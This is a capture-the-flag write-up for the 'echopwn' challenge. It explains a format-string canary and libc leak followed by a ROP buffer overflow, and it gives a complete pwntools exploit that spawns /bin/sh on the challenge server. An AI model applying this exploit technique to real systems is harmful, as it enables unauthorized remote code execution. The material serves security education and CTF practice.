### 0x00 Challenge: echopwn
**Description:**
>nc 168.119.247.237 5011

### 0x01 Write-up:
This program has two vulnerabilities: a format string and a buffer overflow. In this program you can not run code in the stack because it is compiled with NX enabled and it is also compiled with stack-protector (canaries) to prevent buffer overflow attacks, thus to solve this challenge you have to bypass the stack canary protection and make a simple ROP (Return oriented programming) to run system("/bin/sh"). To do this, you need to know the value of the stack canary and a glibc address, so, you can use the format string vulnerability to leak the canary and a libc address.

Therefore, the exploit consist in:
1. Leak canary and libc address;
2. Calculate the libc base address;
3. Search ROP gadgets (pop rdi; ret);
4. Make the payload (bypass the canary + gadgets); and
5. Run it.

**Exploit:**
```python
from pwn import *

context(arch = 'amd64', os = 'linux')

context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./echopwn")
p = remote("168.119.247.237", 5011)

"""
p = gdb.debug("./echopwn", '''
break main
break doRead+123
''')
#p.timeout = 0.5
"""
libc = elf.libc

p.sendline("%13$p,%19$p")
data = p.recvuntil("\x0a").decode('iso-8859-1').replace("echo> ","")
log.info("Canary: " + data.split(",")[0])
canary = int(data.split(",")[0], 16)
libc_start_main_addr = int(data.split(",")[1], 16) - 237
libc.address = libc_start_main_addr - libc.sym.__libc_start_main
log.info(f"libc addr: 0x{libc.address:02x}")
##### ROP Gadgets #####
rop = ROP(libc)
pop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
log.info(f"pop rdi gadget: 0x{pop_rdi:02x}")

p.recvuntil("echo>")
# Exploit
p.sendline(b"A"*52 + p64(canary) + b"AAAAAAAA"+p64(pop_rdi)+p64(next(libc.search(b'/bin/sh\0')))+p64(libc.sym.system))

p.interactive()
```

**Participant write-ups:**  
<a href="https://scavengersecurity.com/dekractf-weird-chall-pwn/">Write-up by Scavenger Security</a>

